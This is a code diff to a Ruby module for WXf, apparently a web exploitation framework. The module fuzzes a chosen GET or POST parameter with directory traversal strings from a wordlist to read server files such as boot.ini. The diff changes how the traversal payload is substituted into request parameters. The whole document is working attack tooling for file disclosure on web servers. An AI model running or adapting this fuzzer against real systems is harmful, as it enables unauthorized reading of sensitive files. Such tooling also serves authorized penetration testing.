@@ -21,7 +21,7 @@ class WebXploit <  WXf::WXfmod_Factory::Auxiliary
      ],
     'Author'      => [ 'CG' ],
     'License'     => WXF_LICENSE
-)
+              )
 			init_opts([
 				OptString.new('FILE',     [true, 'File To View', 'boot.ini']),
 				OptString.new('LFILE', [true, 'Directory Traversal Strings File','wordlists/dir_traversal_strings.txt']),
@@ -34,44 +34,49 @@ class WebXploit <  WXf::WXfmod_Factory::Auxiliary
 	def run
   
 		fuzzparam = datahash['FUZZPARAM'] 
-		file =  datahash['FILE']
+		file =  datahash['FILE'].gsub(/^(.*?)\//,'')
 		fuzzfile = datahash['LFILE']
+		rparams = datahash['RPARAMS']
     
 		begin
    
 			check = File.open(fuzzfile)
 			check.each do |fuzztrav| 
-				string = fuzztrav.strip+file
+			string = fuzztrav.strip+file
 				
-		
+		  new_rparams = nil
 				
 				begin
-				
+          return prnt_err("Enter a parameter to fuzz (FUZZPARAM)") unless fuzzparam != ''
+          return prnt_err("Enter a rparams (RPARAMS)") unless rparams != ''
 				  if  datahash['METHOD'].match(/(GET|get)/)
+				    if rparams.match(/#{fuzzparam}/)
+				      p_to_sub = rparams.match(/#{fuzzparam}=([^&]+).*/)
+				      new_rparams = rparams.gsub(/#{p_to_sub[1]}/, "#{string}")
+				    end
+				  
+				    nrurl = rurl.gsub('?','')
+				    
 				    res = mech_req({
 				      'method'=> 'GET',
-          		'RURL'  =>  "#{rurl}#{string}",
+          		'RURL'  =>  "#{nrurl}?#{new_rparams}",
        				'PROXY_ADDR' => proxya,
-       				'PROXY_PORT' => proxyp,
+       				'PROXY_PORT' => proxyp,       				
 							})
 				  elsif datahash['METHOD'].match(/(POST|post)/)
-       
-				 return prnt_err("Enter a parameter to fuzz (FUZZPARAM)") unless fuzzparam != ''
-				   mod_params = convert_params("#{datahash['RPARAMS']}")
-             mod_params.each_with_index do |arry,idx|
-               if arry[0].match(/#{fuzzparam}/)
-               arry[1] = "#{string}"
-               end 
-             end
-             
+				    mod_params = convert_params("#{rparams}")
+              mod_params.each_with_index do |arry,idx|
+                if arry[0].match(/#{fuzzparam}/)
+                  arry[1] = "#{string}"
+                end 
+              end
 				    res = mech_req({
-				      'method'=> 'POST',
+		          'method'=> 'POST',
               'RURL'  =>  "#{rurl}",
               'PROXY_ADDR' => proxya,
               'PROXY_PORT' => proxyp,
               'RPARAMS' => mod_params
-             })          
-				  
+            })  
 				  end
 
      		 if (res.nil?)
@@ -85,8 +90,7 @@ class WebXploit <  WXf::WXfmod_Factory::Auxiliary
 				
          if (rce)
            print_status("Received #{rce} for #{string}")
-         end
-			  
+         end 
 				end
 			end
   
